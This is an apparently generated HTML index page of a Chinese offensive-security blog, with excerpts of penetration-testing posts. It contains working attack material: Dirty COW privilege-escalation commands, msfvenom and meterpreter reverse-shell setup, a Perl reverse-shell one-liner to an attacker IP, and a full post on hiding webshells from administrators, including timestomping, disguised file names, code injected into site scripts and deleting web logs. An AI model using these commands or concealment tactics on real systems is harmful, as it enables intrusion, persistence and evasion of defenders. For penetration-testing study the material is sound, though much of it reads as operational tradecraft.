@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="klion&#39;s blog"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="website" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>page - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">klion's blog</h1>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/24/SquirrelMail-RCE/">
+                SquirrelMail < 1.4.23 RCE [CVE-2017-7692]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/SquirrelMail-Rce/">SquirrelMail Rce</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 环境简介<br>&nbsp;&nbsp;&nbsp;&nbsp;关于 SquirrelMail 就不用多说了吧[一套开源php 邮件程序][说实话,用这套程序的目标还是蛮多的,尼玛,不说了,都是泪……],在重现漏洞利用之前,我们需要先把邮件服务器简单搭起来,这里以centos 6.8 x86 为例 [为了避免安装过程出问题,iptables和selinux已事先全部关闭],大致的配置过程如下,下面是具体测试环境:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">kali</span> 2017: 执行<span class="selector-tag">SquirrelMail_RCE_exploit</span><span class="selector-class">.sh</span>  利用脚本</div><div class="line"><span class="selector-tag">centos</span> 6<span class="selector-class">.8</span> <span class="selector-tag">x86</span>:  完全模拟真实的生产环境,<span class="selector-tag">lamp</span>全程源码包编译配置<span class="selector-attr">[后期会把各种配置细节更新上来]</span></div><div class="line"><span class="selector-tag">SquirrelMail</span>版本 1<span class="selector-class">.4</span><span class="selector-class">.20</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/24/SquirrelMail-RCE/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/24/kali-config/">
+                kali 实战渗透环境配置指南
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/kali-config/">kali config</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 最近刚好看到kali有更新,想想自己用的系统似乎很久也没更新过了,这里就顺手记录一些关于部署渗透系统的注意事项,留给有需要的朋友做些简单参考</p>
+<p>首先,到kali的官网去下载最新版的kali iso镜像或者虚拟机文件<code>个人还是更建议直接用它官方提供的虚拟机</code>,这里我就直接用它已经配好的虚拟机来做演示说明,也建议大家直接用它官方提供好的虚拟机,不用官方iso镜像是有原因的,以后大家就会明白的,只是不想在部署系统上浪费太多时间<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/images.offensive-security.com/virtual</span>-images/Kali-Linux-<span class="number">2017.1</span>-vm-amd64.<span class="number">7</span>z</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/images.offensive-security.com/virtual</span>-images/Kali-Linux-<span class="number">2017.1</span>-vm-i686.<span class="number">7</span>z</div></pre></td></tr></table></figure></p>
+<p>0x02 虚拟机下载好以后,解压该虚拟机文件,然后到VMware中选择并打开该虚拟机,root的默认密码是toor,进入系统后,编辑source.list文件,修改为官方提供的apt源,强烈建议这里只保留官网提供的apt源即可,尽量不要用任何第三方源,如果被挂马,概不负责,^_^ 务必谨记<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/apt/sources.list</span></div><div class="line">  deb <span class="symbol">http:</span>/<span class="regexp">/http.kali.org/kali</span> kali-rolling main non-free contrib</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/24/kali-config/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/22/dirty/">
+                linux 溢出提权小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/exp/">exp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">'脏牛'</span>[Dirty copy-on-write] 提权小记:</div><div class="line">实际渗透中,提的成功率相对来讲还是蛮高的,屡试不爽,废话不多说,祝大家好运吧,至于漏洞细节,请自行参考公告,影响内核版本  Dirty COW.c  <span class="number">2.6</span>.<span class="number">22</span> &lt; <span class="number">3.9</span> </div><div class="line"></div><div class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</div><div class="line">$ ./dirty admin</div><div class="line">$ su firefart</div><div class="line"><span class="comment"># mv /tmp/passwd.bak /etc/passwd	干完活,一定要记得把东西还原回来,exp已经有相应的msf模块可用,大家请自行尝试</span></div><div class="line"><span class="comment"># exit</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/22/dirty/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/22/win-0day-privilege/">
+                windows 溢出提权小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/exp/">exp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;平时用的相对比较多,就顺手自己记录了一份,不大完整,关键是大家能用上就好,都是一些已知的windows 0day exp,关于各个漏洞的详情,请自行查阅微软安全公告,链接如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/technet.microsoft.com/zh</span>-cn/library/security/dn639106.aspx</div></pre></td></tr></table></figure></p>
+<p>0x02 具体exp利用如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">RPCSS服务没有正确地隔离NetworkService或LocalService帐号下运行的进程,导致本地攻击者可以利用令牌劫持的方式获得权限提升</div><div class="line">漏洞代号: MS09-<span class="number">012</span></div><div class="line">补丁编号: KB952004</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 针对<span class="number">03</span>以下系统,菜刀可用</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/22/win-0day-privilege/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/03/24/mysql-log-write-webshell/">
+                利用mysql的general log 写shell[突破into outfile]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-03-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/webshell/">webshell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你</p>
+<p><img src="/img/show variables waf.png" alt=""><br><br>
+        </div>
+        <a href="/2017/03/24/mysql-log-write-webshell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/03/08/msfvenom-advanced/">
+                msfvenom 进阶 [暂未完...]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-03-08</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/msfvenom/">msfvenom</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 msfvenom 常规选项用途:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">l  列出所有可用的payload,编码器,空指令……</span></div><div class="line">-<span class="ruby">p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span></div><div class="line">-<span class="ruby">f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span></div><div class="line">-<span class="ruby">e  指定要使用那种编码器</span></div><div class="line">-<span class="ruby">i  指定编码的次数,如果使用编码器</span></div><div class="line">-<span class="ruby">b  指定坏字符,比如空字符截断问题,等等……</span></div><div class="line">-<span class="ruby">x  使用一个自定义可执行程序模板,并将payload嵌入其中</span></div><div class="line">-<span class="ruby">k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span></div><div class="line">-<span class="ruby">o  指定创建好的payload的存放位置</span></div></pre></td></tr></table></figure></p>
+<p>0x02 首先,创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></div><div class="line">msf <span class="comment">&gt; set lport 443</span></div><div class="line">msf <span class="comment">&gt; set lhost 192.168.3.12</span></div><div class="line">msf <span class="comment">&gt; exploit -j</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/03/08/msfvenom-advanced/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/01/31/tcpdump-sniffer-pass/">
+                linux下的嗅探实践 [tcpdump篇]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-01-31</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/sniffer/">sniffer</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>单单对于渗透而言,我们可以拿 tcpdump 干些什么:<br>&nbsp;&nbsp;&nbsp;&nbsp;从工具命名不难看出,所谓 tcpdump 的意思,其实就是把 tcp 的数据[当然啦,它并非仅仅支持tcp/ip协议族] dump下来,我想作者应该也是这个意思,在常规生产环境中,运维或者协议分析师可能主要用它来捕捉一些敏感的流量行为(通过不同的数据特征来辨别出哪些流量可能带有入侵或者攻击行为),排查诊断各种网络故障,或者专门针对某个工具进行逆向(流量)分析等等……,就tcpdump本身来讲,它能做的事情非常多,真要仔细讲,可能会像wireshark那样,又得出本书,工具虽然小巧,但用途良多,下面就我们单单就实际渗透过程中的一些用法做些简单科普,主要还是用它来抓抓明文密码[当然,它本身的强大绝非仅限于此,个人能力有限,也没一下子涉及那么多,今天只单单说一个点(可能连个点都算不上吧,基本是没有任何技术含量的)]<br><br><br>以centos 6.x中的具体编译安装为例[在其它的发行版中安装方法基本类似],都非常简单,但考虑到文章的完整性想想还是一并说了算了(主要是想让大家能快速上手),工具是开源的(基于c,安装自然需要c编译器[gcc]),请自行到官方站点下载其源码包:<br><a href="http://www.tcpdump.org/" target="_blank" rel="external">http://www.tcpdump.org/</a><br>
+        </div>
+        <a href="/2017/01/31/tcpdump-sniffer-pass/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/10/06/empire-powershell/">
+                powershell 渗透框架 [empire]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-10-06</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/powershell/">powershell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;对于<code>empire</code>[说实话确实有些老了] 想必大家也都已经不再陌生,很多人说它是<code>神器</code>,嘿嘿……原谅我一直也没搞清楚<code>神器</code>的具体定义到底是什么[虽然,我知道这对于实际渗透并没任何卵用],也许在我有限的认知里,一直都以为只有能在千里之外轻松get到目标系统的system或者root权限的shell的<code>0day</code>才叫神器,如果动不动就把某个确实好用点儿的脚本或者工具就叫神器,未免有点儿草率,也显得不稳重,不是吗,自己有个比较野蛮的习惯,在用别人工具的时候,总是忍不住会观察,因为想尽可能理解它的内部实现[最好也是最直接的一手学习资料],<code>如果换成是我自己这代码会怎么写呢</code>,虽然是后知后觉,但拓展出来的思路足以让自己受益良多[站在别人的肩膀上可以走的更快,这是真的],虽然,自己并没有再把代码把它实现一遍,但对整个工具架构实现已经有了更清晰的理解和把握,到了实际用的时候自然就不一样了[更灵活点儿嘛],以后再看到类似的工具,可能一眼就能看透个百分之七八十,嘿嘿……纯粹是个人喜好哈,听过就好,废话过后,咱们说正题,今天主要是对empire中一些好用的powershell脚本做些简要的使用说明,当然啦,自己已经事先把empire中的powershell脚本选择性的提取了一下,因为我们的重点还是powershell,并非empire脚本本身,整个过程中也不会有任何涉及工具自身使用的东西,其实,empire使用真的非常简单,命令帮助已经写的非常详细了,看看帮助相信大家很快就能上手,不过整个工具最核心的东西还是这些ps脚本[对于一个职业渗透者来讲,您应该一开始就尽量朝着你所能理解的本质去,慢慢的,一旦养成这种习惯,同一个东西,你往往能看见别人看不见的一些小细节],因为这中间有很多脚本跟之前是重复的,所以就选择性的说一些,脚本使用都非常简单,就不再一一截图了,实在是好累啊,还是那句话,关键是大家能在实际渗透中用上,别的都是扯淡<br>
+        </div>
+        <a href="/2016/10/06/empire-powershell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/10/06/powersploit/">
+                powershell 渗透框架 [PowerSploit]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-10-06</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/powershell/">powershell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;和nishang一样,PowerSploit也是一款非常实用的powershell渗透框架,下面就其用法做些简要说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted 还是一样,先放开脚本执行限制,实际渗透中自己bypass一下就好了</div></pre></td></tr></table></figure></p>
+<p>0x02 命令执行类模块 [CodeExecution]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Invoke-Shellcode.ps1 向指定进程中注入我们的shellcode,我们可以通过这种方式弹回一个meterpreter,注意shellcode系统位数版本要跟目标的系统一致才行,另外,权限务够也是必须的</div><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f powershell -o /root/Desktop/shell.txt</span></div><div class="line"><span class="comment"># msfconsole 监听刚才的payload配置</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/10/06/powersploit/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/10/05/nishang/">
+                powershell 渗透框架[ nishang ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-10-05</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/powershell/">powershell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;注意,powershell只能针对win7以后的系统使用,此之前的win系统是没有引入powershell的,powershell是什么这里就不废话了,大家请自行谷歌,在使用各种powrshell脚本过程中,系统权限自然也是越高越好,权限越大你能在系统中操作的范围就越广,至于为什么要选择powershell,想必大家早已心知肚明,免杀,可直接跟系统api交互,容易定制,轻量,远程加载执行,对目标系统的影响极小……好处众多,这里就不多啰嗦了,说破天,我们最终的目的还是希望能在实际渗透中把它用起来,不然,实际价值何在呢</p>
+<p>0x02 关于nishang<br>&nbsp;&nbsp;&nbsp;&nbsp;今天我们就先来看看第一款powershell渗透框架<code>其实,个人觉得把它称为powershell渗透框架似乎更合适些</code>,<code>nishang</code> [想必现在早已家喻户晓],关于nishang中的各个ps脚本的选项用法,在其脚本代码的最前面都有详细说明,使用前请务必仔细阅读,因为系统默认是禁止执行ps脚本的,所以实际用的时候后面都会带上bypass选项<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted  如果你得到的是一个交互式的ps shell,也可以用该命令来放开脚本执行限制</div><div class="line"><span class="comment"># powershell –exec bypass –Command "Get-Host | Select-Object Version"  查看当前powershell版本,有些脚本只能在指定的powershell版本中执行</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/10/05/nishang/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/10/05/hidden-webshell/">
+                放心地种下你的webshell 之 webshell隐藏小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-10-05</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/webshell-hidden/">webshell hidden</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">拿到webshell以后的第一件事儿,就是顺手把webshell时间属性改为和同目录下其它文件相同的时间戳,一般在大马里或其它的一些webshell管理工具都提供了类似的功能</div><div class="line">尽量放在那些程序员和管理都不会经常光顾到的目录中,比如:各种第三方工具(phpmyadmin)的一些插件目录,主题目录以及临时目录等等……</div><div class="line">webshell所在目录层级自然是越深越好,平时网站不出问题的话,一般四五级目录下很少会被人注意到……</div><div class="line">webshell的名字尽量不要太招摇,尤其是像带有<span class="keyword">shell</span><span class="bash">,spy,hack,0day,love,shit……这种很典型常见的关键字(我们渗透最最终的目的还是希望拿到自己想要的东西而不被人察觉,不要因为自己的无知和愚蠢,而造成一些不必要的麻烦),……,在给webshell起名字的时候尽量模仿着当前目录的一些名字特征来取,以混淆视听,比如,我们在目标网站目录中,发现有个叫<span class="string">'node.tpl.php'</span>的文件,那我们就可以模仿他取个叫<span class="string">'plugins.tpl.php'</span>的名字,这样相对容易蒙混过关</span></div><div class="line">webshell里面尽量不要用带有类似eval这种的危险特征,如果是在linux中管理员只需要find grep 一句话就能锁定特征,除了eval,还有比如:exec,system,passthru,shell_exec,assert……这些函数都最好不要用,你可以尝试创建个自定义函数,然后调用它,函数里面可以接你的webshell参数,不仅能在一定程度上延长webshell的存活时间,也加大了管理的查找难度,可以暂时性躲避一些功能比较简陋的waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来想办法构造我们的webshell,关于webshell免杀,后续会专门再说,这里先提一嘴</div><div class="line">你也可以尝试直接把一句话函数插到目标网站自己的脚本文件里面,当然最好是一个非常不起眼的地方,比如:函数库文件,配置文件里面等等,然后你再到另一个导该函数库的脚本文件中去调用那个一句话…</div><div class="line">如果已经拿到服务器权限,可以把网站日志中的所有关于webshell的访问记录以及渗透时造成的一些网站报错记录以及你自己的一些ip访问日志,顺手删掉或者替换都行,如果是linux那就很好办了,sed或者egrep几句话就搞定了,如果windows,嫌麻烦就清空吧,关于记录清理也是个比较大的问题,后续单独说</div><div class="line">尝试利用静态文件(比如,各类图片,css,js,html,txt文件等等)隐藏一句话,然后用.htaccess 进行解析,不这过需要目标开启重写才行,例如.htaccess实现自解析,确实比较老套了,基于.htaccess实现的变种其实还有非常多,这里就不一一说了</div><div class="line">利用php.ini或者<span class="keyword">user</span>.ini来解析你的webshell,想必大家也已经用的比较多了,烂大街了</div><div class="line">如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle能搜到的各种信息等等,最好先通读代码,把里面的webshell箱子剔除一下,推荐用开源的大马,方便定制,记住,我们的webshell尽量不要编码,因为编码也并不能很好解决waf的问题,你知道的,正常的脚本文件是绝对不会编码的,一旦稍微有经验的程序员或者管理看到这些东西,肯定就会被发现,还有,大马中一般都会带有pass或者password类的字符,建议把这些敏感字段全部换成别的,因为管理依然可以通过这种方式快速定位到我们的webshell</div><div class="line">养成好习惯,为了防止权限很快丢失,最好再上传几个备用webshell到不同的目录位置,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,传上去以后确定<span class="keyword">shell</span><span class="bash">正常访问就可以了,不到万不得已不用去访问它,防止留的日志太多,暴露自己</span></div><div class="line">在你已经有机器权限的情况下,还可以看看管理员还有没有自己写的一些webshell监测脚本,比如一些非常可疑的硬链接</div><div class="line">上传图片马,然后再到另一个不起眼的地方尝试去包含它,也是烂大街的东西了,想必大家也已非常熟悉</div><div class="line">如果有可能的话,可以抽空审计下目标代码,尝试在正常的代码中利用回掉的方式构造执行自己的webshell,这种没有任何文件的后门确实比较隐蔽</div><div class="line">脚本执行完以后进行自删除,然后直接把webshell代码驻留在内存中,当然,这种方式有个非常大的弊端,一旦目标重启web服务就废了</div><div class="line">尝试给webshell文件设置一些特殊属性</div><div class="line">更多,待续……</div></pre></td></tr></table></figure></p>
+<p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;上面这些都是自己根据实际渗透中的一些经验以及基于前人的基础上,顺手整理的,不过,无疑中发现个很有意思的事情,不知道是哪位朋友拿着自己曾经残缺的笔记,发了出去,然后网上转的到处都是,嘿嘿……不过没关系啦,反正我在乎的只是技术本身,除此之外的东西,不值一提,当然,基于上面思路的变种肯定还会有非常非常多,也期待能和大家一起多交流,待续…</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/27/revese-shell/">
+                你和目标只差一个shell的距离
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-27</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/shell/">shell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前奏说明<br>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……</p>
+<p>0x02 大致环境<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">win7</span>          192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.128</span></div><div class="line"><span class="selector-tag">centos6</span><span class="selector-class">.8</span>     192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.129</span></div><div class="line"><span class="selector-tag">win2008R2</span>     192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.131</span></div><div class="line"><span class="selector-tag">kali</span>          192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.147</span></div></pre></td></tr></table></figure></p>
+<p>0x03 关于linux平台下弹shell的一些方式</p>
+<p>利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;nc -lvp 53</div><div class="line"># perl -<span class="keyword">e</span> '<span class="keyword">use</span> Socket;<span class="variable">$i</span>=<span class="string">"192.168.1.128"</span>;<span class="variable">$p</span>=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">"tcp"</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);exec(<span class="string">"/bin/bash -i"</span>);&#125;;'</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_perl.png" alt="&#39;&#39;"><br><br>
+        </div>
+        <a href="/2016/09/27/revese-shell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/26/install-py27-on-centos/">
+                快速编译安装配置 py2.7 & jdk 1.7
+            </a>
+        </h1>
